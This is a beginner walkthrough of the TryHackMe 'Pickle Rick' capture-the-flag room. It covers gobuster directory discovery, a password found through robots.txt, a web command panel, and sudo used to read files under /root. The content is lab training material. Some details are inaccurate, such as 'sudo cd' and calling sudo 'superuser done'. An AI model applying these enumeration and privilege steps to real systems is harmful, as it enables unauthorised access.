# [Pickle Rick](https://tryhackme.com/r/room/picklerick) - TryHackMe Walkthrough

## 🛠️ Prerequisites
    
## Ensure OpenVPN is connected
    sudo openvpn <path_to_config>.ovpn

## Start the virtual machine and note the IP address

## 🎯 Objectives

  Find the first ingredient
    Find the second ingredient
    Find the final ingredient

## 📋 Steps to Solve
### Step 1: Initial Reconnaissance

 Open the IP address in your browser
    
    http://<MACHINE_IP>

 Inspect the page source for clues (Ctrl + U or right-click > View Page Source)
 Look for the username in the comments

### Step 2: Find Hidden Pages

 Use Gobuster to find hidden directories

    gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Identified directories:
     
    http://<MACHINE_IP>/login.php
    http://<MACHINE_IP>/assets

### Step 3: Retrieve Login Credentials

 Visit the assets directory and check for robots.txt
    
    http://<MACHINE_IP>/assets/robots.txt

 Retrieve the password for the login page

### Step 4: Login to Command Panel

 Use the credentials to login at:

    http://<MACHINE_IP>/login.php

 After login, verify current directory

    pwd

List files in the directory

    ls

Read the first ingredient

    less Sup3rS3cretPickl3Ingred.txt

### Step 5: Find Second Ingredient

Check sudo privileges

    sudo -l
 Recursively list directories to locate Rick's home directory

    sudo ls ../../../*

 Navigate to Rick's home directory

    cd /home/rick

List files in Rick's directory

    ls

Read the second ingredient

    less "second ingredients"

Step 6: Find Final Ingredient

 Locate the root directory

    sudo ls ../../../*

Navigate to the root directory
    
    sudo cd /root

List files in the root directory

    ls

Read the final ingredient
   
    sudo less 3rd.txt

## 🚀 Tools Used

# Tools and commands
gobuster : Used for find hidden directories
less : command used to read the texts
pwd : present working directory
ls : list contents
sudo : superuser done

## Reference 
Pickle rick: https://tryhackme.com/r/room/picklerick
